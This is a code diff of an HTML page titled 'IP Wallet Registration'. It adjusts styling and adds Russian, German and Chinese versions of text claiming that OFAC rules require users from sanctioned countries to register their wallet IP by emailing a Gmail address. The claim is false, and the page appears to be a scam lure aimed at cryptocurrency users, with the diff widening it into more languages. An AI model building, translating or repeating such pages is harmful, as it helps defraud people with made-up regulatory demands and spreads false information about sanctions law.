@@ -11,10 +11,8 @@
     body {
       margin: 0;
       font-family: Inter, sans-serif;
-      background: linear-gradient(rgba(255,255,255,0.85), rgba(255,255,255,0.85)),
-      url("https://www.bitsight.com/sites/default/files/styles/16_9_large_2x/public/2023/01/04/OFAC-sanctions-vendor-risk-management.webp?itok=l_YbJgmh");
+      background: url("https://www.bitsight.com/sites/default/files/styles/16_9_large_2x/public/2023/01/04/OFAC-sanctions-vendor-risk-management.webp?itok=l_YbJgmh") center/cover no-repeat fixed;
       background-size: cover;
-      background-position: center;
       min-height: 100vh;
     }
 
@@ -38,11 +36,11 @@
     .container {
       max-width: 420px;
       margin: 90px auto 40px;
-      background: rgba(255,255,255,0.92);
+      background: rgba(255,255,255,0.85); /* شفافیت برای نمای بهتر */
       border-radius: 16px;
       padding: 24px;
-      box-shadow: 0 15px 30px rgba(0,0,0,0.15);
-      backdrop-filter: blur(8px); /* برای نمای زیبا و شفاف */
+      box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+      backdrop-filter: blur(10px); /* تار کردن بک‌گراند */
     }
 
     h1 {
@@ -148,7 +146,6 @@
     <li>Russia (restricted entities)</li>
   </ul>
 
-  <!-- Updated Email Explanation -->
   <a class="email" href="mailto:ipwalletchain@gmail.com">
     ipwalletchain@gmail.com
   </a>
@@ -193,6 +190,21 @@ function setLang(lang) {
       title: "IP Wallet Registration",
       desc: "According to OFAC regulations, users from sanctioned countries must register their wallet IP address.",
       note: "Please send the name of your country to this email from your **personal** email address for review and IP registration."
+    },
+    ru: {
+      title: "Регистрация IP кошелька",
+      desc: "Согласно правилам OFAC, пользователи из санкционных стран должны зарегистрировать IP кошелька.",
+      note: "Пожалуйста, отправьте название вашей страны на этот email для проверки."
+    },
+    de: {
+      title: "IP Wallet-Registrierung",
+      desc: "Laut OFAC-Vorschriften müssen Benutzer aus sanktionierten Ländern ihre Wallet-IP-Adresse registrieren.",
+      note: "Bitte senden Sie den Namen Ihres Landes an diese E-Mail zur Überprüfung."
+    },
+    zh: {
+      title: "IP 钱包注册",
+      desc: "根据 OFAC 规定，来自受制裁国家的用户必须注册他们的钱包 IP 地址。",
+      note: "请将您的国家名称发送到此电子邮件以进行审核。"
     }
   };
   document.getElementById("title").innerText = t[lang].title;
